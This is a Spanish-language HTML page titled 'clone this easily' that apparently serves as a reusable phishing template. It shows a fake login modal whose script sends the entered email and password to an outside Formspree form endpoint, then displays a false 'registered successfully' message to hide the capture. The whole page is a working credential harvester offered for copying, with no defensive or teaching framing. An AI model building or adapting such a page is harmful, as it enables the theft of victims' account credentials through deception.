<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CLONA ESTO FACILMENTE</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f0f2f5;
    margin: 0;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    text-align: center;
  }
  h1 {
    font-size: 2.5em;
    margin-bottom: 40px;
    color: #333;
  }
  .btn {
    padding: 16px 32px;
    background: #007bff;
    color: white;
    border: none;
    border-radius: 10px;
    font-size: 18px;
    cursor: pointer;
    transition: 0.3s;
  }
  .btn:hover {
    background: #0056b3;
  }
  .modal {
    display: none;
    position: fixed;
    z-index: 999;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.6);
    justify-content: center;
    align-items: center;
  }
  .modal-content {
    background: white;
    padding: 30px;
    border-radius: 12px;
    width: 90%;
    max-width: 400px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
    text-align: center;
  }
  .input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 6px;
    border: 1px solid #ccc;
    font-size: 16px;
  }
  .loading {
    display: none;
    margin-top: 15px;
    color: #007bff;
    font-weight: bold;
  }
</style>
</head>
<body>

<h1>CLONA ESTO FACILMENTE</h1>
<button class="btn" onclick="abrirModal()">Ingresar</button>

<div class="modal" id="modal">
  <div class="modal-content">
    <h2>Iniciar sesión</h2>
    <form id="formulario" action="https://formspree.io/f/xjkekpdg" method="POST">
      <input type="text" name="correo" class="input" placeholder="Correo" required>
      <input type="password" name="contrasena" class="input" placeholder="Contraseña" required>
      <button type="submit" class="btn">Registrar</button>
    </form>
    <div class="loading" id="loading">Cargando...</div>
  </div>
</div>

<script>
function abrirModal() {
  document.getElementById("modal").style.display = "flex";
}

const form = document.getElementById("formulario");
const loading = document.getElementById("loading");

form.addEventListener("submit", function(event) {
  event.preventDefault(); // Evita recarga de la página
  loading.style.display = "block";

  const formData = new FormData(form);

  fetch(form.action, {
    method: "POST",
    body: formData,
    headers: { 'Accept': 'application/json' }
  })
  .then(response => response.json())
  .then(data => {
    setTimeout(() => {
      loading.style.display = "none";
      form.reset();
      document.getElementById("modal").style.display = "none";

      // Aquí puedes poner la acción de la "aplicación" después del login
      alert("¡Registrado correctamente! La aplicación estaría lista ahora.");
    }, 2000);
  })
  .catch(error => {
    console.error(error);
    loading.style.display = "none";
    alert("Ocurrió un error al registrar");
  });
});
